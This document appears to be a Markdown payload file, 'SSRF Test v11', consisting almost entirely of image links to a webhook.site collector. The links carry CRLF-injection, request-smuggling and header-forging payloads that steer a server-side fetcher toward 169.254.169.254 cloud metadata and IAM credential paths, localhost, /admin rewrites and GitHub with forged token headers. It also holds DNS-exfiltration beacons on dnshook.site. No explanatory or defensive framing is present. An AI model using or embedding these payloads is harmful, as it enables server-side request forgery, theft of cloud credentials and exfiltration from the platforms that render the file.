# SSRF Test v11 - Advanced Combinations

## Baseline
![v11-canary](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/v11-canary.gif)

## CRLF with Chunked Transfer Encoding
![chunk1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/chunk%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a5%0d%0aHello%0d%0a0%0d%0a%0d%0a.gif)
![chunk2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/te%0d%0aTransfer-Encoding:%20identity%0d%0aContent-Length:%200%0d%0a%0d%0a.gif)

## HTTP/2 Pseudo-Headers in CRLF
![h2-1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/h2%0d%0a:authority:%20169.254.169.254%0d%0a.gif)
![h2-2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/h2%0d%0a:path:%20/latest/meta-data/%0d%0a.gif)
![h2-3](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/h2%0d%0a:scheme:%20http%0d%0a:authority:%20169.254.169.254%0d%0a:path:%20/latest/meta-data/iam/security-credentials/%0d%0a.gif)

## Host Header Variations via CRLF
![host1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%200.0.0.0%0d%0a.gif)
![host2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%20127.1%0d%0a.gif)
![host3](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%202130706433%0d%0a.gif)
![host4](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%200x7f000001%0d%0a.gif)
![host5](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%20localtest.me%0d%0a.gif)
![host6](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%20spoofed.burpcollaborator.net%0d%0a.gif)

## Connection Header Injection
![conn1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aConnection:%20keep-alive%0d%0a.gif)
![conn2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aConnection:%20close%0d%0aX-Custom:%20injected%0d%0a.gif)
![conn3](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aUpgrade:%20websocket%0d%0aConnection:%20Upgrade%0d%0a.gif)

## Cache Poisoning Headers via CRLF
![cache1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aX-Forwarded-Proto:%20https%0d%0aX-Forwarded-Port:%20443%0d%0a.gif)
![cache2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aX-Original-URL:%20/admin%0d%0a.gif)
![cache3](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aX-Rewrite-URL:%20/admin%0d%0a.gif)
![cache4](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aX-Host:%20evil.com%0d%0a.gif)

## HTTP Request Pipeline via Double Request
![pipe1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/a.gif%20HTTP/1.1%0d%0aHost:%20webhook.site%0d%0a%0d%0aGET%20http://169.254.169.254/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0aGET%20/ignored)
![pipe2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/b%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/latest/meta-data/iam/security-credentials/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a.gif)

## Absolute URL Override Attempts
![abs1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/@169.254.169.254/latest/meta-data/)
![abs2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/\\169.254.169.254\latest\meta-data\)
![abs3](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/../../../169.254.169.254/latest/)

## Internal GitHub Paths via CRLF
![gh1](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%20api.github.com%0d%0aAuthorization:%20token%20ghp_xxxxxxxxxxxx%0d%0a.gif)
![gh2](https://webhook.site/3fa090cc-2c80-4ece-b5a9-8e17bc09461d/x%0d%0aHost:%20github.com%0d%0aCookie:%20_gh_sess=xxx%0d%0a.gif)

## DNS Exfil with Payload Data
![dns1](https://payload1-data.3fa090cc-2c80-4ece-b5a9-8e17bc09461d.dnshook.site/exfil.gif)
![dns2](https://v11-crlf-success.3fa090cc-2c80-4ece-b5a9-8e17bc09461d.dnshook.site/marker.gif)

## Version Marker
Timestamp: v11-advanced-combinations
